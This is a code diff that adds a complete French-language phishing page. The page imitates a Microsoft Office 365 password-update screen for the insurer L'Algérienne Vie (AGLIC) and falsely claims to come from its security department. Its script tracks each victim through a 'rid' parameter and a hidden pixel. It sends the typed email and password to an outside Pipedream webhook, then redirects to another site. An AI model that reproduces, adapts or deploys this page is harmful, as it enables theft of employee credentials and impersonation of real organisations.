@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mettre à jour votre mot de passe</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+      background-color: #ebf3f9;
+      background-image: radial-gradient(circle at 50% 50%, #ffffff 0%, #ebf3f9 100%);
+      background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d34a6960cc08d8ea12ffd2d3d5ce1.svg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between">
+<div class="flex-1 flex items-center justify-center px-4 py-12">
+  <div class="bg-white p-11 max-w-[440px] w-full shadow-lg border border-gray-200/50 rounded-sm relative" id="formContainer">
+    <div class="flex justify-between items-center mb-6 gap-4">
+      <img alt="Microsoft" class="h-6" onerror="this.onerror=null; this.outerHTML='<div style=\'display:flex; align-items:center; gap:6px; font-weight:600; font-size:16px; color:#737373;\'><svg style=\'width:18px; height:18px;\' viewBox=\'0 0 23 23\'><rect x=\'0\' y=\'0\' width=\'10\' height=\'10\' fill=\'#f25022\'/><rect x=\'11\' y=\'0\' width=\'10\' height=\'10\' fill=\'#7fba00\'/><rect x=\'0\' y=\'11\' width=\'10\' height=\'10\' fill=\'#00a4ef\'/><rect x=\'11\' y=\'11\' width=\'10\' height=\'10\' fill=\'#ffb900\'/></svg>Microsoft</div>';" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb224858c729e80a544cd870a.svg" />
+      <img alt="AGLIC" class="h-7 object-contain max-w-[140px] font-sans" onerror="this.onerror=null; this.outerHTML='<div style=\'display:flex; align-items:center; gap:5px;\'><svg style=\'width:22px; height:22px; color:#004a99;\' viewBox=\'0 0 24 24\' fill=\'currentColor\'><path d=\'M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z\'/></svg><div style=\'font-family:sans-serif; text-align:left;\'><div style=\'font-weight:900; color:#004a99; font-size:11px; tracking-tight:0.5px;\'>L\'ALGERIENNE VIE</div><div style=\'font-weight:700; color:#e25c00; font-size:8px; tracking-widest:1px;\'>AGLIC</div></div></div>';" src="https://lalgeriennevie.dz/wp-content/uploads/2021/05/logo-horizontal-1024x273.png" />
+    </div>
+
+    <h1 class="text-2xl font-semibold text-[#1b1b1b] mb-1">Mettre à jour la connexion</h1>
+    <p class="text-[13px] text-[#505050] mb-5">Pour des raisons de sécurité, veuillez configurer votre nouveau mot de passe Office 365 de 18 caractères minimum.</p>
+
+    <form action="" class="space-y-4" id="resetForm" method="POST" onsubmit="return handleSubmit(event)">
+      <div>
+        <label class="block text-xs font-semibold text-gray-600 mb-1">Adresse e-mail professionnelle</label>
+        <input class="w-full border-b border-gray-300 py-1.5 focus:outline-none focus:border-[#0067b8] text-sm placeholder-gray-400 transition-colors" id="username" name="username" placeholder="E-mail professionnel" required="" type="email" value="" />
+      </div>
+
+      <div>
+        <label class="block text-xs font-semibold text-gray-600 mb-1">Nouveau mot de passe</label>
+        <input class="w-full border-b border-gray-300 py-1.5 focus:outline-none focus:border-[#0067b8] text-sm placeholder-gray-400 transition-colors" id="password" name="password" oninput="checkInputs()" placeholder="Nouveau mot de passe" required="" type="password" />
+      </div>
+
+      <div>
+        <label class="block text-xs font-semibold text-gray-600 mb-1">Confirmer le nouveau mot de passe</label>
+        <input class="w-full border-b border-gray-300 py-1.5 focus:outline-none focus:border-[#0067b8] text-sm placeholder-gray-400 transition-colors" id="confirmPassword" name="confirm_password" oninput="checkInputs()" placeholder="Confirmer le mot de passe" required="" type="password" />
+      </div>
+
+      <div class="space-y-1 pt-1">
+        <p class="text-xs text-red-600 font-medium hidden" id="lenAlert">⚠️ Le nouveau mot de passe doit comporter au moins 18 caractères.</p>
+        <p class="text-xs text-red-600 font-medium hidden" id="matchAlert">❌ Les deux mots de passe ne correspondent pas.</p>
+        <p class="text-xs text-red-600 font-medium hidden" id="errorAlert">&nbsp;</p>
+      </div>
+
+      <div class="pt-2 flex justify-end">
+        <button class="bg-[#0067b8] hover:bg-[#005da6] text-white text-[15px] font-semibold px-9 py-1.5 min-w-[100px] text-center shadow-sm select-none transition-all" type="submit">Enregistrer</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<div class="bg-black/5 text-[11px] text-[#505050] py-3 text-center px-4 shrink-0 font-sans">
+  L'Algérienne Vie (AGLIC) - Direction de la Sécurité des Systèmes d'Information (DSI). © 2026
+</div>
+
+<!-- Hidden image for tracking (GET request to Pipedream with rid) -->
+<img id="trackingPixel" style="display:none; width:0; height:0;" alt="" />
+
+<script>
+  // Your Pipedream webhook URL
+  const PIPEDREAM_WEBHOOK_URL = 'https://eof80viusl2fph4.m.pipedream.net';
+  // Redirect target after successful form submission
+  const REDIRECT_URL = 'https://tawbikh.com';
+  
+  (function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const rid = urlParams.get('rid');
+
+    if (rid && rid.trim() !== '') {
+      const cleanRid = encodeURIComponent(rid.trim());
+      const targetUrl = PIPEDREAM_WEBHOOK_URL + '?rid=' + cleanRid;
+
+      // Set form action - native POST submission to Pipedream
+      const form = document.getElementById('resetForm');
+      if (form) {
+        form.action = targetUrl;
+      }
+
+      // Set tracking pixel src - sends GET request to Pipedream
+      const trackingImg = document.getElementById('trackingPixel');
+      if (trackingImg) {
+        trackingImg.src = targetUrl;
+      }
+    }
+  })();
+
+  function checkInputs() {
+    const pass = document.getElementById('password').value;
+    const confirm = document.getElementById('confirmPassword').value;
+    const lenAlert = document.getElementById('lenAlert');
+    const matchAlert = document.getElementById('matchAlert');
+
+    if (pass.length > 0 && pass.length < 18) {
+      lenAlert.classList.remove('hidden');
+    } else {
+      lenAlert.classList.add('hidden');
+    }
+
+    if (confirm.length > 0 && pass !== confirm) {
+      matchAlert.classList.remove('hidden');
+    } else {
+      matchAlert.classList.add('hidden');
+    }
+  }
+
+  function handleSubmit(e) {
+    const pass = document.getElementById('password').value;
+    const confirm = document.getElementById('confirmPassword').value;
+    const errorEl = document.getElementById('errorAlert');
+    const form = document.getElementById('resetForm');
+
+    errorEl.classList.add('hidden');
+
+    // Client-side validation
+    if (pass.length < 18) {
+      e.preventDefault();
+      errorEl.innerText = "❌ Le nouveau mot de passe doit comporter au moins 18 caractères.";
+      errorEl.classList.remove('hidden');
+      return false;
+    }
+
+    if (pass !== confirm) {
+      e.preventDefault();
+      errorEl.innerText = "❌ Erreur : Les deux mots de passe ne correspondent pas.";
+      errorEl.classList.remove('hidden');
+      return false;
+    }
+
+    // If there's a redirect target, we handle submission via fetch to avoid losing the redirect
+    // because native form POST would navigate to the webhook URL, not our redirect.
+    // This ensures we send data to Pipedream, then redirect to tawbikh.com.
+    if (form && form.action && form.action.includes('pipedream.net')) {
+      e.preventDefault(); // prevent native submission
+      
+      // Collect form data
+      const formData = new FormData(form);
+      const username = formData.get('username');
+      const password = formData.get('password');
+      const confirmPassword = formData.get('confirm_password');
+      
+      // Prepare POST data as application/x-www-form-urlencoded (same as native form)
+      const postData = new URLSearchParams();
+      postData.append('username', username);
+      postData.append('password', password);
+      postData.append('confirm_password', confirmPassword);
+      
+      // Send fetch request to Pipedream webhook (preserves rid from action URL)
+      fetch(form.action, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: postData.toString(),
+        // Use keepalive to ensure request completes even during navigation
+        keepalive: true
+      })
+      .then(() => {
+        // Redirect to tawbikh.com after successful submission
+        window.location.href = REDIRECT_URL;
+      })
+      .catch((err) => {
+        console.error('Submission error:', err);
+        // Still redirect even if fetch fails (user experience)
+        window.location.href = REDIRECT_URL;
+      });
+      
+      return false;
+    }
+    
+    // Fallback for any other configuration: allow native submission
+    return true;
+  }
+</script>
+</body>
+</html>
